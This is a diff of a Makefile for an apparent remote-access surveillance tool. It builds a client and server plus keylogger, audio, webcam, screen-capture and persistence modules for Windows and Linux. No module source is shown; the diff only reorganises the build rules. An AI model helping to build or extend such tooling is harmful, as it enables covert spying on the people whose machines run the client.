@@ -45,12 +45,15 @@ CLIENT_TARGET = $(BIN_DIR)/client$(EXE_EXT)
 SERVER_TARGET = $(BIN_DIR)/server$(EXE_EXT)
 
 # Module targets
-MODULES = keylogger audiorecord webcam persistence
+LINUX_ONLY_MODULES = keylogger audiorecord webcam screenrecord
+CROSS_PLATFORM_MODULES = persistence
+MODULES = $(CROSS_PLATFORM_MODULES) $(LINUX_ONLY_MODULES)
 MODULE_TARGETS = $(addprefix $(BUILD_DIR)/, $(MODULES))
 
 # Source files
-CLIENT_SRC = $(SRC_DIR)/client.c $(SRC_DIR)/persistence.c $(SRC_DIR)/crypto.c
-SERVER_SRC = $(SRC_DIR)/server.c $(SRC_DIR)/crypto.c
+UTIL_SRC = $(SRC_DIR)/util.c
+CLIENT_SRC = $(SRC_DIR)/client.c $(SRC_DIR)/persistence.c $(SRC_DIR)/crypto.c $(UTIL_SRC)
+SERVER_SRC = $(SRC_DIR)/server.c $(SRC_DIR)/crypto.c $(UTIL_SRC)
 
 # Object files (in src directory to keep things clean)
 CLIENT_OBJ = $(CLIENT_SRC:.c=.o)
@@ -92,10 +95,14 @@ $(SRC_DIR)/%.o: $(SRC_DIR)/%.c
 
 # Build individual modules (statically linked for portability)
 $(BUILD_DIR)/%: $(MODULES_DIR)/%.c | $(BUILD_DIR)
-ifeq ($(DETECTED_OS),Windows)
 	$(CC) $(CFLAGS) -static $< -o $@$(EXE_EXT)
+
+# Special rule for screenrecord module (requires X11 libraries)
+$(BUILD_DIR)/screenrecord: $(MODULES_DIR)/screenrecord.c | $(BUILD_DIR)
+ifeq ($(DETECTED_OS),Windows)
+	$(CC) $(CFLAGS) $< -o $@$(EXE_EXT) -lgdi32 -luser32
 else
-	$(CC) $(CFLAGS) -static $< -o $@
+	$(CC) $(CFLAGS) $< -o $@ -lX11 -lXext
 endif
 
 # Clean build files
@@ -135,7 +142,8 @@ windows: CC=x86_64-w64-mingw32-gcc
 windows: CFLAGS=$(BASE_CFLAGS) -D_WIN32_WINNT=0x0600
 windows: LDFLAGS=-lws2_32 -ladvapi32 -lshell32 -lssl -lcrypto
 windows: EXE_EXT=.exe
-windows: $(BIN_DIR) $(BUILD_DIR) $(CLIENT_TARGET) $(SERVER_TARGET) $(MODULE_TARGETS)
+windows: $(BIN_DIR) $(BUILD_DIR) $(CLIENT_TARGET) $(SERVER_TARGET) \
+         $(addprefix $(BUILD_DIR)/, $(CROSS_PLATFORM_MODULES))
 
 linux: CC=gcc
 linux: CFLAGS=$(BASE_CFLAGS) -D_GNU_SOURCE -D_POSIX_C_SOURCE=200809L
@@ -187,10 +195,9 @@ help:
 	@echo ""
 	@echo "Available modules:"
 	@echo "  keylogger      - Captures keyboard input"
-	@echo "  ram-hog        - Memory consumption tool"
 	@echo "  audiorecord    - Audio recording via OSS/ALSA"
-	@echo "  videorecord    - Screen recording"
 	@echo "  webcam         - Webcam capture via V4L2"
+	@echo "  screenrecord   - Screen recording and screenshots via X11/framebuffer"
 	@echo "  persistence    - Persistence mechanisms"
 	@echo ""
 	@echo "Cross-platform notes:"
